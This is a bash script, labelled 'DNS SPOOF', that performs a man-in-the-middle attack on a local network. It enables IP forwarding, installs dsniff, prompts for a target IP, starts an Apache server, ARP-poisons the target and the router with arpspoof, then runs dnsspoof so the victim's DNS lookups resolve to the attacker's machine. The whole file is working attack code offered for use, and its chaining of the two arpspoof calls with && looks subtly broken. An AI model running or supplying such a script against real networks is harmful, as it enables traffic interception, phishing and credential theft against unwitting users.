#!/bin/bash

clear

if [ "$EUID" -ne 0 ]
then 
echo -e "\e[31mPls run this script as root user\e[0m"
exit
fi

logo=$(figlet DNS SPOOF)
echo -e "\e[41;93m\e[1m$logo\e[0m"

echo 1 > /proc/sys/net/ipv4/ip_forward

### CHECK FOR UTILS
check_for_utils () {
check_pkg=$(dpkg -s dsniff | grep "Status: install ok installed")
if [ "$check_pkg" == "" ]
then
sudo apt install dsniff
else
echo -e "\e[32mrequirements already satisfied\e[0m"
echo " "
fi
}
check_for_utils


### GET MY IP
get_my_ip () {
interface=$(ip route get 8.8.8.8 | grep -oP 'dev \K[^ ]+')
MY_IP=$( ip route get 8.8.8.8 | grep -oP 'src \K[^ ]+' )
}

### GET ROUTER IP
get_router_ip () {
    router_ip=$(netstat -nr | awk '$1 == "0.0.0.0"{print$2}')
    if [ "$router_ip" != "" ]
    then
    get_my_ip
    else
    echo -e "\e[31mPls connect to a router\e[0m"
    echo " "
    exit
    fi 
}

read -p "ENTER HOST IP -> " target_ip

##########################################
if [ "$target_ip" == "" ]
then
echo -e "\e[31mPls provide the target ip\e[0m"
echo " "
exit 
fi

check_target_ip () {
    ping -c1 $target_ip
    if [ "$?" -ne 0 ]
    then
    echo -e "\e[31mtarget is down\e[0m"
    exit 
    else
    echo -e "\e[32mtarget is up\e[0m"
    echo ""
    fi
}
check_target_ip
##########################################

### STRAT APACHE2
start_apache2 () {
$(service apache2 start)
if [ "$?" -eq 0  ]
then
echo -e "\e[32mapache server running\e[0m"
echo " "
else
echo -e "\e[31mapache server not running\e[0m"
echo " "
fi
}


start_spoof () {
    get_router_ip
    start_apache2
    read -p "Enter file path ->" txt_file
    if [ -f "$txt_file" ]
    then
    echo "
    interface : $interface
    your ip addr: $MY_IP
    router ip addr: $router_ip
    "

    $(arpspoof -t "$target_ip" "$router_ip" && arpspoof -t "$router_ip" "$target_ip")
    $(dnsspoof -f "$txt_file" host "$target_ip" and udp port 53)
    else
    echo -e "\e[31mFile not found\e[0m"
    fi
}

start_spoof